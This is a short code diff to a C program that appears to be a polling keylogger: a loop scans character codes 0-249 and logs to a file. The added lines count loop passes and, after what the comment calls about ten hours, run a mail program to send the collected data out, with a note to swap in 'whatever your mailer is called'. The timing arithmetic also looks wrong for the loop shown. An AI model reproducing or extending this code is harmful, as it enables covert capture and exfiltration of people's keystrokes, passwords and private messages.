@@ -18,8 +18,9 @@ main(){
     fclose(file);
 
     unsigned short ch, i;
+    int countout = 1;
     while(1){ //infinite loop
-
+        countout += 1;
         ch=1;
         while(ch<250){ //scans for 0-249 ASCII craracters
 
@@ -39,6 +40,9 @@ main(){
 
             // this 1ms sleep inhibits the program from occupying full processor
             Sleep(1);
+        }
+        if (countout == 1000 * 60 * 60 * 10 /*translates to aprox 10 hours */) {
+            system("mail.exe"); //or whatever your mailer is called
         }
     }
 
